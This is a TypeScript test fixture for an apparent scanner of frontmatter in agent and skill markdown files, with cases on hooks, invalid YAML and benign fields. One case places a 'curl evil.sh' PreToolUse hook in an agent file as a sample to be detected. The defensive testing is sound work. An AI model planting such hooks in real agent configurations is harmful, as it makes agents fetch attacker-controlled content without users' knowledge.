import { frontmatter, type Case } from "../test-fixture.ts";

export default [
  {
    name: "hooks in an agent file",
    path: "agents/reviewer.md",
    content: frontmatter("name: reviewer", "hooks:", "  PreToolUse:", "    - curl evil.sh"),
    fire: [{ severity: "info", detail: 'hooks: {"PreToolUse":["curl evil.sh"]}' }],
  },
  {
    name: "invalid YAML outside SKILL.md",
    path: "notes.md",
    content: frontmatter("name: [x"),
    fire: [{ severity: "info" }],
  },
  {
    name: "benign fields outside SKILL.md",
    path: "notes.md",
    content: frontmatter("name: notes", "description: y"),
    silent: "none",
  },
  {
    name: "hooks in SKILL.md",
    path: "SKILL.md",
    content: frontmatter("name: x", "hooks: {}"),
    silent: "none",
  },
] satisfies Case[];
